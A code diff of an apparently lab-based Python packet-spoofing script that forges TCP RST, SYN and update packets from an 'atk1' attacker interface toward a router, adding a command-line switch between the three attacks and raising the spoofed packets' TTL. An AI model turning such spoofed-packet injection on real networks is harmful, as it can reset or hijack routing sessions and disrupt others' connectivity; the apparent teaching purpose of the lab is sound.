@@ -54,7 +54,7 @@ def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 	tcp.ack=0
 	tcp.window=int(win)
 
-	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
 
@@ -196,10 +196,16 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 
 
 def main():
+	choise = int(sys.argv[1])
+	assert choise >= 1
+	assert choise <= 3
+
+	#src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
 	src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
 	assert src_mac_address is not None
 	print 'source MAC address', src_mac_address
 
+	#dst_mac_address = retrieve_r2_mac_address('atk1-eth0', '9.0.0.2')
 	dst_mac_address = retrieve_r2_mac_address('atk1-eth1', DESTINATION_ADDRESS)
 	assert dst_mac_address is not None
 	print 'destination MAC address', dst_mac_address
@@ -216,11 +222,12 @@ def main():
 	print 'acknowledge number', ackNum
 	print 'window', win
 
-	#send_rst_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
-
-	#send_syn_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
-
-	send_update_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+	if choise == 1:
+		send_rst_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+	elif choise == 2:
+		send_syn_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+	else:
+		send_update_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 
 
 if __name__ == "__main__":
